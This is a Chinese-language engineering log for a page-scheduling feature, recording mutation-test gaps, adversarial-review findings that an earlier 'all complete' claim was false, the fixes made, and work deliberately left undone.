**新建(P12–P18 寫完於 2026-09-05;⚠️ 見下面「對抗式 review 的帳」——當時宣稱的「全部完成」是假的):**

| 做什麼 | P | 落在哪 |
|---|---|---|
| `INotificationChannel` 出站接縫 | P12 | `api/notification_delivery.py` |
| item 層級的排程宣告 + 內容導出的 `trigger_id` | P13 | `workflow/user_schedules.py` |
| 索引表 + 寫入路徑上的維護 | P14 | `api/schedule_index.py`、`files/facade.py` 的 `on_write` |
| sweeper 讀 item 宣告並驅動 | P15 | `workflow/user_schedule_sweep.py` |
| 排程列數護欄(config) | P16 | `server.max_page_schedules`,接進 lifespan |
| 無外殼路由 | P17 | `web/src/pages/WuiPage.tsx`,`/w/:slug/:itemId/*` |
| 頁面開 run 的入口與事件回傳 | P18 | `wui/run` 路由、`startRun` 動詞、`renderers/wui/run.ts` |

⚠️ **P18 動了一條寫死的規矩。** `protocol.ts` 原本寫「介面永遠不再長新動詞」,而 `startRun`
是一個新動詞。規矩已改寫成它現在真正的樣子:**對「能力」關閉**(碰得到外部系統的東西一律是
`callTool` 目標),可以再加的是**平台原語**,而且必須是 tool call 表達不了的。`startRun` 是:
`callTool` 只答一次,run 要報告幾分鐘的進度。**下一個要加的欠同樣一段書面理由,否則這條規矩
就等於沒有了。**

⚠️ **每個 phase 的突變測試帳(綠的都是我的測試太弱,不是程式碼錯):**

| P | 洞 | 最貴的那個 |
|---|---|---|
| P12 | 0 / 6 | — |
| P13 | 1 / 10 | 分支在預設值下永遠等價,對錯兩種寫法都讓 `is_due` 說是 |
| P14 | 1 / 8 | 測試斷言的是清單,而守衛真正防的是「每次存檔多一次寫入」 |
| P15 | **4 / 8** | **鎖和帳本互相掩護**——單行程裡兩者之間沒有 await,連併發測試都照樣綠 |
| P16 | — | 設定守門在欄位沒人讀時自己咬 |
| P17 | 1 / 4 | 兩個錯誤訊息都含路徑,只斷言路徑就分不出「檔案不在」和「不是頁面」 |
| P18 | 2 / 8 | **runtime 的事件分支完全沒測試**——把進度當成答案,頁面會在第一個事件就以為跑完 |

## 對抗式 review 的帳(2026-09-05,四個 lens,P21–P28 修正)

四個 lens(conformance / veracity / defect / regression)平行跑、彼此看不到對方。
結論很直接:**P12–P20 宣稱的「全部完成」是假的,而且不是小瑕疵——排程從來沒有真的動過一次。**

判準是「最嚴重的那條」,不是數量。這一輪最嚴重的三條:

| 找到什麼 | 為什麼看不出來 | 修在 |
|---|---|---|
| **頁面存 `schedules.json` → 索引不到 → 永遠不會跑** | `on_write` 掛在 `_write_unchecked`,而頁面的 `writeFile` 走 PUT → `write_from_path`,那是另一條尾巴。P14 的 commit 宣稱「坐在每個寫入共用的咽喉點」——那句是假的 | P21 |
| **頁面按一次按鈕,run 去讀寫使用者的預設聊天室** | `chat_id` 捏了一個 uuid,`drive_turn` 查不到就退回 item 預設對話 | P22 |
| **`schedules.json` 在 skill 裡出現 0 次** | 頁面是 LLM 照著 skill 寫的,所以沒有任何頁面會宣告排程 | P24 |

其餘(同樣都是靜默的):`trigger_payload` 寫了沒人讀(三個 lens 各自指到同一條)、`tz` 被接受被雜湊
然後被忽略、`every: minutes` 的 `n: 90` 其實是每小時、啟動失敗永久燒掉那個視窗、短暫讀取失敗會
**永久註銷**排程、sweep 把 specstar 同步 I/O 壓在 event loop 上(PR#657 事故同一類)、sweep 會
重建被回收的 sandbox、`chart/` 被誤判而**靜默失去 8 條守衛**(在標題叫「guards that actually
cover it」的那個 commit 裡)、`startRun` 的 `run_id` 永遠是空字串、範例讀了平台不存在的欄位、
索引沒有 CAS、10 分鐘逾時**從來沒有接線**、兩個 config 沒有文件。

### 這一輪學到的三件事(比清單重要)

1. **「守衛存在」不等於「守衛會咬」。** `chart/` 那條的證據不是讀碼,是把 `fetch()` 塞進
   `chart/index.html` 看它有沒有紅。突變探針是唯一能分辨這兩件事的東西。
2. **判準要從原始碼導出,不要手抄。** 三個 lens 都只報了兩條漏掉的寫入路徑;從 facade 原始碼
   導出「哪些方法會讓位元組落地」之後是**七個方法**(外加 `edit` 的第二條分支)。真正瞎掉的
   確實只有那兩條——但**「其餘五條沒事」是被驅動證明的,不是被讀出來的**,而且第二輪 review
   正是在那條沒被驅動到的 `_edit_cas` 分支找到第八個洞。手抄報告只會補到報告寫的那些。
3. **替身要模擬對面的契約。** `startRun` 的測試替身回傳 `{run_id:"run-1"}` 並送出
   `type:"step"`——平台兩者都不送。範例是照著替身寫的,所以全綠。
   (更正:第二輪 review 指出範例讀 `e.exit_code` **不是**替身教的——那個欄位只存在於 `callTool`
   的回覆上,是被搬到事件上的。錯誤的病因寫進教訓裡,會讓下一個人防錯方向。)

### 第二輪 review(修完之後再跑一次,regression + veracity)

換掉機制的修法本身就是新程式碼,所以修完再跑一輪——而且刻意用 **veracity** 和 **regression**
而不是 defect:換掉的東西單獨讀一定是對的(那就是它被寫出來的原因),危險的是舊機制順便做的事
被靜默丟掉,以及修法宣稱了做不到的事。

它抓到的(全部已修):

| 找到什麼 | 性質 |
|---|---|
| `_in_zone` 只接 `ZoneInfoNotFoundError`,但 `ZoneInfo` 對 `"/absolute"` 丟 `ValueError` → **一列壞時區讓整份檔案倒下**,好的那幾列也不跑 | 我這輪**新引進**的當機 |
| 失敗計數是 per-trigger 一輩子,不是 per-window → 一月壞過三次的排程,二月第一次失敗就放棄 | 修法本身的缺陷 |
| `_edit_cas` 落地位元組但不呼叫 `_landed`,而導出守衛用的 `MemoryFileStore` 沒有 `write_cas`,**永遠走不到那條分支** | 守衛涵蓋不到它宣稱的整類 |
| `index.forget` 和 `deliver_pending` 的 update 還壓在 event loop 上,而註解宣稱「全部 offload 了」 | 修一半宣稱修完 |
| **event loop 測試只還原一個 offload 也會過**——它數心跳次數,而 6/7 offload 時心跳照跳 | 守衛存在但不會咬 |
| `record` 的 CAS 拿掉 `expected_etag`,17 條測試全綠 | 同上 |
| reference.md 把身分規則**講反了**(「改一列不會重跑」——實際上改一列就是新排程,同一天可能再跑一次) | 寄給頁面作者的假話 |
| 事件型別清單**漏掉每一種失敗**(`step_failed`/`run_cancelled`),而那段還寫著「照這份抄」 | 同上 |
| `dom` 文件寫 1–28,驗證器收 1–31;`n` 的除數清單漏了 60 | 同上 |
| `root_path` 的說明宣稱它也管 SPA 的資源路徑(schema 註解自己說不是) | 給 operator 的假話 |
| 「911 個前端測試」實測是 **3651**;「六條守衛」實測是 **8**;「七個寫入路徑」被寫成六 | 從記憶寫出來的數字 |

⚠️ **這一輪學到的第四件事:數字不要用寫的。** 上面三個錯數字,同一個改動裡都有程式可以算出來,
而我用回想的。判準是:**能被導出的數字就不要出現在散文裡。**

⚠️ **而且「守衛會咬」要逐一驗。** event loop 那條和 CAS 那條都是綠的、都被我當成保證,實際上
一個只還原一個 offload 就過、一個拿掉 etag 也過。現在兩條都有逐項突變探針(五個 offload 各驗一次,
控制組必綠、還原必綠)。

### 知情未做(這一輪沒補,理由寫在這裡)

- **Q5「全 item 看得到所有排程,任何人可取消」沒有介面。** 頁面可以 `readFile` 自己的
  `schedules.json` 並畫出來(reference.md 已經教了),所以**單一頁面內**看得到;但「item 上有哪些
  幽靈排程」仍然要先知道是哪個資料夾。這是一個**新功能**不是缺陷修復,規模是一個 FE 視圖 +
  一條列舉路由,留給下一輪拍板。
- **sweep 讀檔會喚醒被回收的 sandbox** 的根因在 `kill_idle` 不清位址列(既有行為,非本輪程式碼)。
  本輪的修法是讓 sweep 改讀持久快照,所以**這條路徑**不再喚醒;位址列本身仍未清。
- **`build_trigger_start` 對 `ActiveRunExists` 刻意燒掉視窗**(註解明說),那是既有決定,沒有動。
  頁面排程走的是另一條,已改成有上限地歸還。

## 知情不做

- **每個 owner 的 LLM 額度帳本** — LiteLLM 是計量器、429 是訊號,平台已有處理(#759)。自己再蓋
  一套就是兩套管同一件事。
- **分鐘級以下的排程** — 需要「即時」的正確形狀是**事件**,不是把間隔調更細。排程負責「按時」,
  事件負責「即時」,兩者不重疊。
- **把頁面發給看不到 item 的人** — 見 Deploy 那節。
- **事件入口** — 延後,見上面那節。兩個例子都不需要它才能成立。
- **同時進行中的 run 上限** — 沙盒額度已經是那個界線。
